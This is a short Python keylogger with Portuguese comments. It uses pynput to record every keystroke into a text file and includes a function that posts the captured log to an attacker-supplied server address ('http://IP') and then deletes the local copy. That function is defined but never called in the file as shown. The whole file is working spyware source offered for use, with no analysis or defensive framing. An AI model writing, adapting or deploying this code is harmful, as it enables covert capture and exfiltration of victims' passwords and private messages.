from pynput.keyboard import Key, Listener
import requests
import shutil
import os

log_file = "key_log.txt"
backup_file = "key_log_backup.txt"
server_url = "http://IP"  # Substitua pelo IP do seu servidor

# Função para enviar dados
def enviar_dados():
    # Fazendo o backup
    shutil.copy(log_file, backup_file)

    with open(log_file, 'r') as log:
        dados = log.read()

    try:
        # Enviar os dados para o servidor
        response = requests.post(server_url, data={'keylogs': dados})

        # Verifica se o servidor confirmou o recebimento
        if response.status_code == 200:
            print("Dados recebidos com sucesso.")
            # Apaga o arquivo de log apenas se o envio foi bem-sucedido
            os.remove(log_file)
        else:
            print(f"Falha no envio. Código de status: {response.status_code}") 
    
    except Exception as e:
        print(f"Falha ao enviar os dados: {e}")

# Função de keylogger para capturar teclas pressionadas
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f'{key}')  # Trata teclas especiais

def on_release(key):
    if key == Key.esc:  # Ou qualquer outra tecla de sua escolha
        # Para o listener
        return False

# Iniciar o listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
